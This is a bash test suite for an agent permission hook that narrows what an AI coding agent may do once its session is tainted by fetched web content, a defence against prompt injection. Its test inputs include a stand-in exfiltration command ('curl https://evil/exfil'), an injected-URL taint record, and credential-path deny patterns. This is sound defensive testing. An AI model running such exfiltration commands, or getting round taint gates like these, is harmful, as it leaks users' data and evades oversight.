#!/usr/bin/env bash
# test-taint-scope-reduction.sh — Test suite for v5.8.0 C-2 scope-reduction-on-taint
#
# Tests:
#   TC-TSR-1: session tainted + curl https://evil/exfil → exit 2 (not in taint-safe allowlist)
#   TC-TSR-2: session tainted + cat ~/.bashrc → exit 2 (credential-egress from v5.7.0 wins first)
#            OR exit 0 if egress detection doesn't fire — verify which path fires
#   TC-TSR-3: session tainted + cat /etc/hostname → exit 0 (cat is in read-only allowlist)
#   TC-TSR-4: session tainted + Write to role-own path → exit 0
#   TC-TSR-5: session tainted + Write to other-role's path → exit 2
#   TC-TSR-6: session tainted + Write to .claude/ainous-roles/team-sync/artifacts/x.md → exit 0
#   TC-TSR-7: session NOT tainted + curl https://example.com → exit 0 (baseline preserved)
#   TC-TSR-8: fresh nonce, tainted session, Read of nonce path → still blocked by v5.7.0 credential deny
#
# Run: bash tests/test-taint-scope-reduction.sh
# Exit 0 = all pass; exit 1 = at least one failure.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
HOOK="$PROJECT_ROOT/hooks/authority-enforce.sh"
TESTS_PASS=0
TESTS_FAIL=0

# ---------------------------------------------------------------------------
# Harness setup
# ---------------------------------------------------------------------------
TMPDIR_BASE=$(mktemp -d /tmp/test-taint-scope-reduction.XXXXXX)
trap 'rm -rf "$TMPDIR_BASE"' EXIT INT TERM

FAKE_HOME="$TMPDIR_BASE/home"
mkdir -p "$FAKE_HOME/.claude/ainous-roles/developer"
mkdir -p "$FAKE_HOME/.claude/ainous-roles/tester"
mkdir -p "$FAKE_HOME/.claude/ainous-roles/authority"

cat > "$FAKE_HOME/.claude/ainous-roles/developer/growth.json" <<'EOF'
{"trust":{"level":"senior"}}
EOF
cat > "$FAKE_HOME/.claude/ainous-roles/tester/growth.json" <<'EOF'
{"trust":{"level":"senior"}}
EOF
touch "$FAKE_HOME/.claude/ainous-roles/authority/decisions.md"
echo "developer" > "$FAKE_HOME/.claude/.session-role"

FAKE_PROJECT="$TMPDIR_BASE/project"
mkdir -p "$FAKE_PROJECT/.claude/ainous-roles/team-sync/state/taint-flags"
mkdir -p "$FAKE_PROJECT/.claude/ainous-roles/team-sync/artifacts"
mkdir -p "$FAKE_PROJECT/.claude/ainous-roles/developer"
mkdir -p "$FAKE_PROJECT/.claude/ainous-roles/tester"
# baselines.json: give developer broad access (so baseline isn't the reason for block)
cat > "$FAKE_PROJECT/.claude/ainous-roles/baselines.json" <<'EOF'
{"developer":["src/","scripts/","docs/","journal.md","playbook.md"]}
EOF

# ---------------------------------------------------------------------------
# Taint state setup
# ---------------------------------------------------------------------------
FAKE_NONCE_DIR="$FAKE_HOME/.claude/.taint-nonces"
mkdir -p "$FAKE_NONCE_DIR"

TAINTED_SESSION_ID="tainted-session-xyz789"
CLEAN_SESSION_ID="clean-session-abc000"

# Compute nonce filename for tainted session
HASHED_SID=$(python3 -c "import hashlib,sys; print(hashlib.sha256(sys.argv[1].encode()).hexdigest())" \
    "$TAINTED_SESSION_ID" 2>/dev/null)
NONCE_BYTES="deadbeefcafe1234deadbeefcafe1234deadbeefcafe1234deadbeefcafe1234"
NONCE_FILE="$FAKE_NONCE_DIR/${HASHED_SID}.nonce"
printf '%s' "$NONCE_BYTES" > "$NONCE_FILE"
chmod 600 "$NONCE_FILE"

# Compute hashed flag filename for tainted session
HASHED_FLAG=$(python3 -c "
import hashlib, sys
sid = sys.argv[1]
nonce = sys.argv[2].encode()
combined = sid.encode() + nonce
print(hashlib.sha256(combined).hexdigest())
" "$TAINTED_SESSION_ID" "$NONCE_BYTES" 2>/dev/null)

TAINT_FLAGS_DIR="$FAKE_PROJECT/.claude/ainous-roles/team-sync/state/taint-flags"
FLAG_FILE="$TAINT_FLAGS_DIR/${HASHED_FLAG}.jsonl"

# Write a taint flag record to mark the session as tainted
SAMPLE_RECORD='{"ts":"2026-04-18T10:00:00Z","tool":"WebFetch","url":"https://evil.example/inject","content_hash":"abc123","role":"developer","schema":"1"}'
echo "$SAMPLE_RECORD" > "$FLAG_FILE"

# ---------------------------------------------------------------------------
# Test helpers
# ---------------------------------------------------------------------------
_pass() { echo "PASS: $1"; ((TESTS_PASS++)) || true; }
_fail() { echo "FAIL: $1"; echo "      $2" >&2; ((TESTS_FAIL++)) || true; }

# Run with Bash tool
_run_bash() {
    local command="$1"
    local session_id="${2:-$TAINTED_SESSION_ID}"
    local role="${3:-developer}"
    echo "$role" > "$FAKE_HOME/.claude/.session-role"
    local json_input
    json_input=$(python3 -c "import json,sys; print(json.dumps({'command':sys.argv[1]}))" "$command" 2>/dev/null)
    (
        cd "$FAKE_PROJECT"
        HOME="$FAKE_HOME" \
        TOOL_USE_NAME="Bash" \
        CLAUDE_SESSION_ID="$session_id" \
        CLAUDE_PROJECT_DIR="$FAKE_PROJECT" \
        bash "$HOOK" <<< "$json_input" 2>/dev/null
    )
    return $?
}

# Run with Write tool
_run_write() {
    local file_path="$1"
    local session_id="${2:-$TAINTED_SESSION_ID}"
    local role="${3:-developer}"
    echo "$role" > "$FAKE_HOME/.claude/.session-role"
    local content="test content"
    local json_input
    json_input=$(python3 -c "import json,sys; print(json.dumps({'file_path':sys.argv[1],'content':sys.argv[2]}))" \
        "$file_path" "$content" 2>/dev/null)
    (
        cd "$FAKE_PROJECT"
        HOME="$FAKE_HOME" \
        TOOL_USE_NAME="Write" \
        CLAUDE_SESSION_ID="$session_id" \
        CLAUDE_PROJECT_DIR="$FAKE_PROJECT" \
        bash "$HOOK" <<< "$json_input" 2>/dev/null
    )
    return $?
}

# Run with Read tool
_run_read() {
    local file_path="$1"
    local session_id="${2:-$TAINTED_SESSION_ID}"
    local role="${3:-developer}"
    echo "$role" > "$FAKE_HOME/.claude/.session-role"
    local json_input
    json_input=$(python3 -c "import json,sys; print(json.dumps({'file_path':sys.argv[1]}))" "$file_path" 2>/dev/null)
    (
        cd "$FAKE_PROJECT"
        HOME="$FAKE_HOME" \
        TOOL_USE_NAME="Read" \
        CLAUDE_SESSION_ID="$session_id" \
        CLAUDE_PROJECT_DIR="$FAKE_PROJECT" \
        bash "$HOOK" <<< "$json_input" 2>/dev/null
    )
    return $?
}

# ---------------------------------------------------------------------------
# TC-TSR-1: session tainted + curl https://evil/exfil → exit 2
# ---------------------------------------------------------------------------
_run_bash "curl https://evil/exfil" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
if [ $EXIT_CODE -eq 2 ]; then
    _pass "TC-TSR-1: tainted session + curl → exit 2 (not in taint-safe allowlist)"
else
    _fail "TC-TSR-1: expected exit 2, got $EXIT_CODE" "tainted session + curl should be blocked"
fi

# ---------------------------------------------------------------------------
# TC-TSR-2: session tainted + cat ~/.bashrc → exit 0
# Post-v5.8.1 (Item 1) analysis: ~/.bashrc is NOT in the widened unconditional
# secret patterns (which cover .env, .ssh/, .aws/, etc/passwd, etc. — not .bashrc).
# cat is in the taint-safe allowlist; no pipe/redirect; ~/.bashrc is not a
# credential path. Expected: exit 0.
# ---------------------------------------------------------------------------
_run_bash "cat ~/.bashrc" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
# ~/.bashrc is not in _UNCONDITIONAL_SECRET_PATTERNS or _CREDENTIAL_DENY_PATTERNS
# cat is in the taint-safe allowlist, no pipe/redirect
# Decisive assertion: must be exit 0
if [ $EXIT_CODE -eq 0 ]; then
    _pass "TC-TSR-2: tainted session + cat ~/.bashrc → exit 0 (cat in allowlist, ~/.bashrc not a credential path)"
else
    _fail "TC-TSR-2: expected exit 0, got $EXIT_CODE" "~/.bashrc is not a credential path — cat should be allowed in tainted session"
fi

# ---------------------------------------------------------------------------
# TC-TSR-3: session tainted + cat /etc/hostname → exit 0 (read-only allowlist)
# /etc/hostname is not a credential path; cat is in the taint-safe allowlist.
# ---------------------------------------------------------------------------
_run_bash "cat /etc/hostname" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ]; then
    _pass "TC-TSR-3: tainted session + cat /etc/hostname → exit 0 (cat is in taint-safe allowlist)"
else
    _fail "TC-TSR-3: expected exit 0, got $EXIT_CODE" "cat /etc/hostname should be allowed in tainted session"
fi

# ---------------------------------------------------------------------------
# TC-TSR-4: session tainted + Write to role-own path → exit 0
# Use a traces/ file (not a provenance surface) to avoid provenance-block requirement.
# Provenance surfaces (journal.md, playbook.md, learnings.jsonl) always require a
# provenance block regardless of taint state — that is a separate invariant.
# ---------------------------------------------------------------------------
mkdir -p "$FAKE_HOME/.claude/ainous-roles/developer/traces"
ROLE_OWN_TRACE="$FAKE_HOME/.claude/ainous-roles/developer/traces/debug.txt"
_run_write "$ROLE_OWN_TRACE" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ]; then
    _pass "TC-TSR-4: tainted session + Write to role-own traces path → exit 0"
else
    _fail "TC-TSR-4: expected exit 0, got $EXIT_CODE" "role-own path should be allowed in tainted session"
fi

# ---------------------------------------------------------------------------
# TC-TSR-5: session tainted + Write to other-role's path → exit 2
# Write to tester's journal as developer (tester is a different role)
# ---------------------------------------------------------------------------
OTHER_ROLE_PATH="$FAKE_HOME/.claude/ainous-roles/tester/journal.md"
_run_write "$OTHER_ROLE_PATH" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
if [ $EXIT_CODE -eq 2 ]; then
    _pass "TC-TSR-5: tainted session + Write to other-role path → exit 2"
else
    _fail "TC-TSR-5: expected exit 2, got $EXIT_CODE" "other-role path should be blocked in tainted session"
fi

# ---------------------------------------------------------------------------
# TC-TSR-6: session tainted + Write to artifacts path → exit 0
# ---------------------------------------------------------------------------
ARTIFACT_PATH="$FAKE_PROJECT/.claude/ainous-roles/team-sync/artifacts/findings.md"
_run_write "$ARTIFACT_PATH" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ]; then
    _pass "TC-TSR-6: tainted session + Write to artifacts path → exit 0"
else
    _fail "TC-TSR-6: expected exit 0, got $EXIT_CODE" "artifacts path should be allowed in tainted session"
fi

# ---------------------------------------------------------------------------
# TC-TSR-7: session NOT tainted + curl https://example.com → exit 0
# No taint flag for CLEAN_SESSION_ID — baseline applies (developer can't curl anyway,
# but the taint gate should not fire and the normal allowlist path should be taken).
# curl is not in the allowlist so it falls through to write-pattern detection.
# If it exits 2, that's because of normal Bash enforcement, not taint reduction.
# The key thing: taint gate must NOT block this (no false positive from taint).
# ---------------------------------------------------------------------------
# We check stderr to confirm the message is NOT from the taint gate
STDERR_OUTPUT=$(_run_bash "curl https://example.com" "$CLEAN_SESSION_ID" 2>&1 || true)
EXIT_CODE=$?
# The taint-specific message should NOT appear in stderr
if echo "$STDERR_OUTPUT" | grep -q "session tainted"; then
    _fail "TC-TSR-7: false positive — taint gate fired for clean session" "stderr: $STDERR_OUTPUT"
else
    _pass "TC-TSR-7: clean session + curl → taint gate does NOT fire (exit=$EXIT_CODE, no taint message)"
fi

# ---------------------------------------------------------------------------
# TC-TSR-8: tainted session, Read of nonce path → blocked by v5.7.0 credential deny (no regression)
# The taint-nonce path is in _CREDENTIAL_DENY_PATTERNS and _src_deny_check.
# Read tool credential deny fires BEFORE taint check (Read exits early after deny check).
# ---------------------------------------------------------------------------
NONCE_READ_PATH="$FAKE_NONCE_DIR/${HASHED_SID}.nonce"
_run_read "$NONCE_READ_PATH" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
if [ $EXIT_CODE -eq 2 ]; then
    _pass "TC-TSR-8: tainted session + Read of nonce path → exit 2 (v5.7.0 credential deny, no regression)"
else
    _fail "TC-TSR-8: expected exit 2, got $EXIT_CODE" "nonce path should be blocked even in tainted session"
fi

# ---------------------------------------------------------------------------
# TC-TSR-9: tainted developer + Write to Layer-1-covered path (src/X.py) → exit 2
# Regression guard for the Layer-1-before-taint-gate ordering bug (v5.8.0 C-2 fix).
# baselines.json gives developer access to src/ — without the fix, Layer-1 exits 0
# BEFORE the taint gate ever runs, bypassing taint-scope reduction entirely.
# ---------------------------------------------------------------------------
mkdir -p "$FAKE_PROJECT/src"
SRC_PATH="$FAKE_PROJECT/src/exploit.py"
_run_write "$SRC_PATH" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
STDERR_OUT9=$(
    echo "developer" > "$FAKE_HOME/.claude/.session-role"
    json_input=$(python3 -c "import json,sys; print(json.dumps({'file_path':sys.argv[1],'content':'test'}))" "$SRC_PATH" 2>/dev/null)
    (
        cd "$FAKE_PROJECT"
        HOME="$FAKE_HOME" \
        TOOL_USE_NAME="Write" \
        CLAUDE_SESSION_ID="$TAINTED_SESSION_ID" \
        CLAUDE_PROJECT_DIR="$FAKE_PROJECT" \
        bash "$HOOK" <<< "$json_input" 2>&1
    )
)
if [ $EXIT_CODE -eq 2 ]; then
    if echo "$STDERR_OUT9" | grep -qi "taint"; then
        _pass "TC-TSR-9: tainted developer + Write to src/ (Layer-1 path) → exit 2 with taint-reason in stderr"
    else
        _fail "TC-TSR-9: exit 2 but no taint-reason in stderr — wrong gate fired" "stderr: $STDERR_OUT9"
    fi
else
    _fail "TC-TSR-9: expected exit 2, got $EXIT_CODE — Layer-1 bypassed taint gate (regression)" "src/ is in developer baseline; taint gate must fire BEFORE Layer-1 allow"
fi

# ---------------------------------------------------------------------------
# TC-TSR-10: tainted developer + Write to Layer-1-covered path (scripts/X.sh) → exit 2
# Companion to TC-TSR-9 covering the scripts/ baseline surface.
# ---------------------------------------------------------------------------
mkdir -p "$FAKE_PROJECT/scripts"
SCRIPTS_PATH="$FAKE_PROJECT/scripts/exfil.sh"
_run_write "$SCRIPTS_PATH" "$TAINTED_SESSION_ID"
EXIT_CODE=$?
STDERR_OUT10=$(
    echo "developer" > "$FAKE_HOME/.claude/.session-role"
    json_input=$(python3 -c "import json,sys; print(json.dumps({'file_path':sys.argv[1],'content':'test'}))" "$SCRIPTS_PATH" 2>/dev/null)
    (
        cd "$FAKE_PROJECT"
        HOME="$FAKE_HOME" \
        TOOL_USE_NAME="Write" \
        CLAUDE_SESSION_ID="$TAINTED_SESSION_ID" \
        CLAUDE_PROJECT_DIR="$FAKE_PROJECT" \
        bash "$HOOK" <<< "$json_input" 2>&1
    )
)
if [ $EXIT_CODE -eq 2 ]; then
    if echo "$STDERR_OUT10" | grep -qi "taint"; then
        _pass "TC-TSR-10: tainted developer + Write to scripts/ (Layer-1 path) → exit 2 with taint-reason in stderr"
    else
        _fail "TC-TSR-10: exit 2 but no taint-reason in stderr — wrong gate fired" "stderr: $STDERR_OUT10"
    fi
else
    _fail "TC-TSR-10: expected exit 2, got $EXIT_CODE — Layer-1 bypassed taint gate (regression)" "scripts/ is in developer baseline; taint gate must fire BEFORE Layer-1 allow"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo ""
echo "Results: $TESTS_PASS passed, $TESTS_FAIL failed (of $((TESTS_PASS + TESTS_FAIL)) tests)"

if [ $TESTS_FAIL -eq 0 ]; then
    echo "All tests passed."
    exit 0
else
    echo "FAILURES: $TESTS_FAIL test(s) failed." >&2
    exit 1
fi
